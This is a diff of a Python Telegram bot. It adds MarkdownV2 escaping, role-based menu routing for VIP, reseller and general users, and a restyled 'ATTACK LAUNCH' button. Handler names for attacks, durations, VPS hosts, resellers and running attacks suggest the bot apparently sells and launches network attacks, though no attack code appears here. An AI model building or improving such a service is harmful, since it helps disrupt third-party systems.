@@ -2514,8 +2577,8 @@ async def add_group_id_input(update: Update, context: CallbackContext):
             
             await update.message.reply_text(
                 f"✅ *Group ID {group_id} added successfully!*\n\n"
-                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
-                parse_mode='Markdown'
+                f"*Current allowed groups:* {escape_markdown(', '.join(str(gid) for gid in ALLOWED_GROUP_IDS), version=2)}\n\n", # Escape list
+                parse_mode='MarkdownV2' # Use MarkdownV2
             )
         else:
             current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -2539,8 +2602,8 @@ async def remove_group_id_start(update: Update, context: CallbackContext):
     
     await update.message.reply_text(
         f"⚠️ *Enter the group ID to remove from allowed list.*\n\n"
-        f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
-        parse_mode='Markdown'
+        f"*Current allowed groups:* {escape_markdown(', '.join(str(gid) for gid in ALLOWED_GROUP_IDS), version=2)}\n\n", # Escape list
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
     return REMOVE_GROUP_ID
 
@@ -2553,8 +2616,8 @@ async def remove_group_id_input(update: Update, context: CallbackContext):
             
             await update.message.reply_text(
                 f"✅ *Group ID {group_id} removed successfully!*\n\n"
-                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
-                parse_mode='Markdown'
+                f"*Current allowed groups:* {escape_markdown(', '.join(str(gid) for gid in ALLOWED_GROUP_IDS), version=2)}\n\n", # Escape list
+                parse_mode='MarkdownV2' # Use MarkdownV2
             )
         else:
             current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -2606,6 +2669,20 @@ async def back_to_home(update: Update, context: CallbackContext):
             f"🏠 *Returned to main menu*\n\n",
             parse_mode='Markdown',
             reply_markup=co_owner_markup
+        )
+    else: # For VIP/Reseller/General users
+        user_id = str(update.effective_user.id)
+        if user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
+            markup = vip_markup
+        elif is_reseller(update):
+            markup = reseller_markup
+        else:
+            markup = group_user_markup
+        
+        await update.message.reply_text(
+            f"🏠 *Returned to main menu*\n\n",
+            parse_mode='Markdown',
+            reply_markup=markup
         )
     return ConversationHandler.END
 
@@ -2679,12 +2756,12 @@ async def reseller_status_info(update: Update, context: CallbackContext):
         if len(message_text) > 4000:
             part1 = message_text[:4000]
             part2 = message_text[4000:]
-            await update.message.reply_text(part1, parse_mode='Markdown')
-            await update.message.reply_text(part2, parse_mode='Markdown')
+            await update.message.reply_text(part1, parse_mode='MarkdownV2') # Use MarkdownV2
+            await update.message.reply_text(part2, parse_mode='MarkdownV2') # Use MarkdownV2
         else:
             await update.message.reply_text(
                 message_text,
-                parse_mode='Markdown',
+                parse_mode='MarkdownV2', # Use MarkdownV2
                 reply_markup=owner_menu_markup if is_owner(update) else co_owner_menu_markup
             )
     except Exception as e:
@@ -2720,8 +2797,8 @@ async def add_co_owner_input(update: Update, context: CallbackContext):
             
             await update.message.reply_text(
                 f"✅ *Co-owner with ID {user_id} added successfully!*\n\n"
-                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
-                parse_mode='Markdown'
+                f"*Current co-owners:* {escape_markdown(', '.join(str(oid) for oid in CO_OWNERS), version=2)}\n\n", # Escape list
+                parse_mode='MarkdownV2' # Use MarkdownV2
             )
         else:
             current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -2749,8 +2826,8 @@ async def remove_co_owner_start(update: Update, context: CallbackContext):
     
     await update.message.reply_text(
         f"⚠️ *Enter the user ID of the co-owner to remove.*\n\n"
-        f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
-        parse_mode='Markdown'
+        f"*Current co-owners:* {escape_markdown(', '.join(str(oid) for oid in CO_OWNERS), version=2)}\n\n", # Escape list
+        parse_mode='MarkdownV2' # Use MarkdownV2
     )
     return GET_REMOVE_CO_OWNER_ID
 
@@ -2765,8 +2842,8 @@ async def remove_co_owner_input(update: Update, context: CallbackContext):
             
             await update.message.reply_text(
                 f"✅ *Co-owner with ID {user_id} removed successfully!*\n\n"
-                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS) if CO_OWNERS else 'None'}\n\n",
-                parse_mode='Markdown'
+                f"*Current co-owners:* {escape_markdown(', '.join(str(oid) for oid in CO_OWNERS) if CO_OWNERS else 'None', version=2)}\n\n", # Escape list
+                parse_mode='MarkdownV2' # Use MarkdownV2
             )
         else:
             current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -2926,7 +3003,7 @@ async def handle_button_click(update: Update, context: CallbackContext):
 
     if query == 'Start':
         await start(update, context)
-    elif query == 'Attack':
+    elif query == '🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃': # Updated button text
         await attack_start(update, context)
     elif query == 'Set Duration':
         await set_duration_start(update, context)
@@ -3084,7 +3161,7 @@ def main():
     )
 
     attack_handler = ConversationHandler(
-        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("Attack"), attack_start)],
+        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃"), attack_start)], # Updated button text
         states={
             GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
         },
@@ -3387,7 +3464,7 @@ def main():
     application.add_handler(set_vps_handler)
     application.add_handler(CommandHandler("running", show_running_attacks))
     application.add_handler(CommandHandler("listbots", show_bot_list_cmd))
-    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("start", start)) # Changed to use the new start function
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
     application.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, track_new_chat))
